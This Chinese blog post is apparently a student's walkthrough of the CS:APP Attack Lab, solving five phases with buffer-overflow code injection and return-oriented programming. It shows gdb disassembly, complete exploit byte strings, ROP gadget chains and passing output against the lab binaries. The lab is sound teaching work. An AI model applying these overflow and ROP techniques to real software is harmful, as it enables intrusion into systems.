---
title: Attack_lab
date: 2018-12-08 17:49:57
categories:
 - CS:APP
tags:
 - CS:APP
 - 汇编
 - 代码注入攻击
---

### 实验描述

<!-- more -->

本次实验利用程序需要外部输入的特点，输入机器码对程序返回值覆盖，以达到攻击的目的，即在getbuf函数需要的输入中做手脚，以致不能正常返回，执行攻击代码。

#### 第一阶段

第一阶段中栈随机化未开机，可以得知内存位置的确切地址，且栈中机器码可执行。

那么我们将需要执行的操作码和地址输入机器码即可。

#### phase_1

第一关非常简单，题目主要我们在getbuf执行完成后执行touch1,touch1()无参。

```assembly
(gdb) disas getbuf 
Dump of assembler code for function getbuf:
   0x0000000000401688 <+0>:	sub    $0x18,%rsp
   0x000000000040168c <+4>:	mov    %rsp,%rdi
   0x000000000040168f <+7>:	callq  0x4018ca <Gets>
   0x0000000000401694 <+12>:	mov    $0x1,%eax
   0x0000000000401699 <+17>:	add    $0x18,%rsp
   0x000000000040169d <+21>:	retq   
End of assembler dump.
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004016a0 <+0>:	sub    $0x8,%rsp
   0x00000000004016a4 <+4>:	movl   $0x1,0x2029ee(%rip)        # 0x60409c <vlevel>
   0x00000000004016ae <+14>:	mov    $0x402e4e,%edi
   0x00000000004016b3 <+19>:	callq  0x400bd0 <puts@plt>
   0x00000000004016b8 <+24>:	mov    $0x1,%edi
   0x00000000004016bd <+29>:	callq  0x401ab5 <validate>
   0x00000000004016c2 <+34>:	mov    $0x0,%edi
   0x00000000004016c7 <+39>:	callq  0x400d60 <exit@plt>
End of assembler dump.
```

可以看到，getbuf开出了0x18，即24字节的空间，touch1的地址为0x4016a0。那么我们只需填满这0x28空间，再以touch1地址替代返回值。注意：x86-64机器中，采用小端法，其低位字节存放在低地址，故我们输入数据时，先输入低位。

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
a0 16 40 00 00 00 00 00
```

转换后输入即可

```bash
Cookie: 0x63149380
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	2017211523
	course	f18
	lab	attacklab
	result	117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00
```

#### phase_2

第二关根据题意，需要调用touch2，需要传递一个无符号整数值，其值为cookie，查看cookie文件，如下。

```bash
2017211523@bupt3:~/target117$ cat cookie.txt 
0x63149380
```

为了给touch2传参，我们需要将cookie值赋给%rdi，然后将touch2地址压栈，使用ret弹出touch2地址返回，调用touch2。

```assembly
mov     $0x63149380,%rdi
pushq   $0x4016cc
ret
```

将其编译为二进制之后在反汇编，得到如下，由此我们便知指令的机器码是多少。

```assembly
phase2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 80 93 14 63    mov    $0x63149380,%rdi
   7:   68 cc 16 40 00          pushq  $0x4016cc
   c:   c3                      retq
```

我们将指令的机器码放在getbuf时的栈顶，然后将返回值位置设置为栈顶地址，这样既可达到目的，调用getbuf时栈顶地址为0x5566f7a8。

```bash
48 c7 c7 80 93 14 63 68
cc 16 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
a8 f7 66 55 00 00 00 00
```

输入运行。

```bash
2017211523@bupt3:~/target117$ ./hex2raw < phase2 | ./ctarget -q
Cookie: 0x63149380
Type string:Touch2!: You called touch2(0x63149380)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	2017211523
	course	f18
	lab	attacklab
	result	117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 
```

#### phase_3

查看touch3

```cpp
void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
	printf("Touch3!: You called touch3(\"%s\")\n", sval);
	validate(3);
} else {
	printf("Misfire: You called touch3(\"%s\")\n", sval);
	fail(3);
}
	exit(0);
}
```

可知其需要一个指向字符的指针sval，然后调用hexmatch，将cookie和sval作为参数传入，需要hexomatch返回非零值。

```cpp
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
```

由hexmatch可知，其比较cookie的字符串表示与传入的字符串是否相等，相等则返回1，那么问题明了，我们需要将表示cookie的字符串地址传给touch3，与第二题不同的是字符串需要有空间保存，我们需要在栈中找出调用hexmatch时候未被重写改变的空间，借以保存字符串。

```assembly
mov     $0x5566f7c8,%rdi
pushq   $0x4017a0
ret
```

这里我们将cookie的字符串表示放在0x5566f7c8，编译再反汇编得到机器码

```assembly
phase3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 c8 f7 66 55    mov    $0x5566f7c8,%rdi
   7:   68 a0 17 40 00          pushq  $0x4017a0
   c:   c3                      retq
```

查表得出cookie字符串的16进制表示为36 33 31 34 39 33 38  30，注意：以字符串形势比较时不用再反转输入，且字符串应有结尾字符‘\0’，得到攻击字符串如下

```bash
48 c7 c7 c8 f7 66 55 68
a0 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
a8 f7 66 55 00 00 00 00
36 33 31 34 39 33 38 30
00
```

转换输入运行

```bash
2017211523@bupt3:~/target117$ ./hex2raw < phase3 | ./ctarget -q
Cookie: 0x63149380
Type string:Touch3!: You called touch3("63149380")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	2017211523
	course	f18
	lab	attacklab
	result	117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00
```

#### 第二阶段

在此阶段，程序添加了两个现代计算机程序几乎必须的对抗缓缓冲区溢出攻击的措施：  

1.函数栈随机化 ，无法再获取绝对地址。  

2.栈内存的内容被锁定为不可执行。  

故此，我们需要使用ROP(面向返回编程)，即使用程序中本来就存在的代码组成我们需要的操作，再将其地址作为返回值，不断用ret指令返回完成所需操作。

#### phase_4

此关需用ROP方法完成phase_2内容。那么就需要在操作中得到cookie值，那么只有用pop指令了，需要指令为。

```assembly
popq 	%rax
movq	%rax,%rdi
ret
```

查找官方的write up，得知对应机器码，然后在在rtarget文件的反汇编文件中利用vim查找对应代码地址。将其放入攻击字符串，得到攻击字符串为。  

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3c 18 40 00 00 00 00 00	/*	popq rax		*/
80 93 14 63 00 00 00 00	/*	cookie			*/
49 18 40 00 00 00 00 00	/*	movq %rax,%rdi 	*/
cc 16 40 00 00 00 00 00 /*	touch2			*/
```

转换输入运行

```bash
2017211523@bupt3:~/target117$ ./hex2raw < phase4 | ./rtarget 
Cookie: 0x63149380
Type string:Touch2!: You called touch2(0x63149380)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

#### phase_5

此关为phase_3的ROP版本，我们需要查找start_farm到end_farm中的gadgets，拼凑出代码实现phase_3中插入代码的功能。还需注意：  

1.0x90代表nop，除了将pc加1之外不做任何事。  

2.不分双字节指令，设置标志位，不改变寄存器的值，可以使用。 

需要的指令有

```assembly
movq	%rsp,%rax
movq	%rax,%rdi
popq	%rax
movl	%eax,%ecx
movl	%ecx,%edx
movl	%edx,%esi
lea(%rdi, %rsi, 1),%rax
movq	%rax,%rdi
```

则攻击字符串为

```bash
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
bd 18 40 00 00 00 00 00	/*	gadget1			*/
49 18 40 00 00 00 00 00	/*	gadget2			*/
30 18 40 00 00 00 00 00	/* 	gadget3			*/
48 00 00 00 00 00 00 00	/*	cookie字符串偏移量*/
13 19 40 00 00 00 00 00	/*	gadget4			*/
ca 18 40 00 00 00 00 00	/*	gadget5			*/
b7 18 40 00 00 00 00 00	/*	gadget6			*/
69 18 40 00 00 00 00 00	/*	gadget7			*/
49 18 40 00 00 00 00 00	/*	gadget8			*/
a0 17 40 00 00 00 00 00 /*	touch3地址   	   */
36 33 31 34 39 33 38 30 /* 	cookie字符串	  */
00
```

转换文件运行

```bash
2017211523@bupt3:~/target117$ ./hex2raw < phase5 | ./rtarget 
Cookie: 0x63149380
Type string:Touch3!: You called touch3("63149380")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

### 到此为止

